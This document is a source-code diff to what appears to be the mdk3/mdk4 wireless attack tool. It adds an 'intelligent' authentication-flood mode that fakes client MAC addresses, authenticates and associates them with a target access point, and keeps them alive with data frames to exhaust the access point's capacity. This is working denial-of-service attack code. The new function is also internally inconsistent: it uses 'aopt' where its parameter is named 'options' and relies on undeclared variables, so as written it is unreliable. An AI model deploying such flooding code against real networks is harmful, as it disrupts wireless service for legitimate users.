@@ -15,6 +15,8 @@
 #define AUTH_DOS_STATUS_NEW	0
 #define AUTH_DOS_STATUS_UP	1
 #define AUTH_DOS_STATUS_FROZEN	2
+#define AUTH_DOS_STATUS_AUTHED	1
+#define AUTH_DOS_STATUS_READY	2
 
 struct auth_dos_options {
   struct ether_addr *target;
@@ -135,11 +137,11 @@ void auth_dos_sniffer() {
 	if (authpack->status == 0) {
 	  curap->responses++;
 	  if (curap->status == AUTH_DOS_STATUS_NEW) {
-	    printf("\rAP "); print_mac(*bssid); printf(" is responding!              \n");
+	    printf("\rAP "); print_mac(*bssid); printf(" is responding.              \n");
 	    curap->status = AUTH_DOS_STATUS_UP;
 	    curap->missing = 0;
 	  } else if ((curap->status == AUTH_DOS_STATUS_UP) && (! (curap->responses % 500))) {
-	     printf("\rAP "); print_mac(*bssid); printf(" is currently handling %d clients!!!\n", curap->responses);
+	     printf("\rAP "); print_mac(*bssid); printf(" is currently handling %d clients.\n", curap->responses);
 	  }
 	  if (curap->status == AUTH_DOS_STATUS_FROZEN) {
 	    printf("\rAP "); print_mac(*bssid); printf(" is accepting connections again!\n");
@@ -198,17 +200,121 @@ struct ether_addr auth_dos_get_target() {
 }
 
 
+struct packet auth_dos_intelligent_getpacket(struct auth_dos_options *options) {
+  struct clistauthdos *search, *cl = NULL;
+  static int oldclient_count = 0, init_intelligent = 0;
+  static unsigned char capabilities[2];
+  static unsigned char *ssid;
+  struct ether_addr *fmac, *ap;
+  struct packet beacon;
+  struct ieee_hdr *hdr;
+  
+  if (! init_intelligent) {
+    // Building first fake client to initialize list
+    if (aopt->valid_mac) fmac = generate_mac(MAC_KIND_CLIENT);
+      else fmac = generate_mac(MAC_KIND_RANDOM);
+    init_clist(&cl, fmac, 0, ETHER_ADDR_LEN);
+    cl = add_to_clistauthdos(cl, fmac, AUTH_DOS_STATUS_NEW, 0, 0);
+    
+    // Setting up statistics counters
+    ia_stats.c_authed = 0;
+    ia_stats.c_assoced = 0;
+    ia_stats.c_kicked = 0;
+    ia_stats.c_created = 1;	//Has been created while initialization
+    ia_stats.d_captured = 0;
+    ia_stats.d_sent = 0;
+    ia_stats.d_responses = 0;
+    ia_stats.d_relays = 0;
+
+    // Starting the response sniffer
+    if (! sniffer) {
+      sniffer = malloc(sizeof(pthread_t));
+      pthread_create(sniffer, NULL, (void *) auth_dos_intelligent_sniffer, (void *) NULL);
+    }
+
+    // Sniff one beacon frame to read the capabilities of the AP
+    printf("Sniffing one beacon frame to read capabilities and SSID...\n");
+    while (1) {
+    beacon = osdep_read_packet();
+    if (beacon.len == 0) exit(-1);
+    hdr = (struct ieee_hdr *) beacon.data;
+    if (hdr->type == IEEE80211_TYPE_BEACON) {
+        ap = get_bssid(beacon);
+        if (MAC_MATCHES(ap, aopt->target)) {
+	  ssid = get_ssid(&beacon);
+	  //TODO memcpy(capabilities, pkt_sniff+34, 2);
+	  //TODO printf("Capabilities are: %02X:%02X\n", capabilities[0], capabilities[1]);
+	  printf("SSID is: %s\n", ssid);
+	  break;
+	}
+      }
+    }
+
+	// We are now set up
+	init_intelligent = 1;
+    }
+
+    // Skip some clients for more variety
+    current = current->next;
+    current = current->next;
+
+    if (oldclient_count < 30) {
+	// Make sure that mdk3 doesn't waste time reauthing kicked clients or keeping things alive
+	// Every 30 injected packets, it should fake another client
+	oldclient_count++;
+
+	search = search_status(current->next, 1);
+	if (search != NULL) {
+	    //there is an authed client that needs to be associated
+	    return create_assoc_frame_simple(target, search->data, capabilities, ssid, ssid_len);
+	}
+
+	search = search_status(current->next, 2);
+	if (search != NULL) {
+	    //there is a fully authed client that should send some data to keep it alive
+	    if (we_got_data) {
+		ia_stats.d_sent++;
+		return get_data_for_intelligent_auth_dos(search->data);
+	    }
+	}
+    }
+
+    // We reach here if there either were too many or no old clients
+    search = NULL;
+
+    // Search for a kicked client if we didn't reach our limit yet
+    if (oldclient_count < 30) {
+	oldclient_count++;
+	search = search_status(current, 0);
+    }
+    // And make a new one if none is found
+    if (search == NULL) {
+	if (random_mac) fmac = generate_mac(0);
+	    else fmac = generate_mac(1);
+	search = add_to_clist(current, fmac, 0, ETHER_ADDR_LEN);
+	free(fmac);
+	ia_stats.c_created++;
+	oldclient_count = 0;
+    }
+
+    // Authenticate the new/kicked clients
+    return create_auth_frame(target, 0, search->data);
+}
+
+
 struct packet auth_dos_getpacket(void *options) {
   struct auth_dos_options *aopt = (struct auth_dos_options *) options;
   struct packet pkt;
   static unsigned int nb_sent = 0;
   static time_t t_prev = 0;
   
+  if (aopt->intelligent) return auth_dos_intelligent_getpacket(aopt);
+
   if (! sniffer) {
     sniffer = malloc(sizeof(pthread_t));
     pthread_create(sniffer, NULL, (void *) auth_dos_sniffer, (void *) NULL);
   }
-
+  
   if (! aopt->target) {
      if ((nb_sent % 1024 == 0) || ((time(NULL) - t_prev) >= 5)) {
        t_prev = time(NULL);
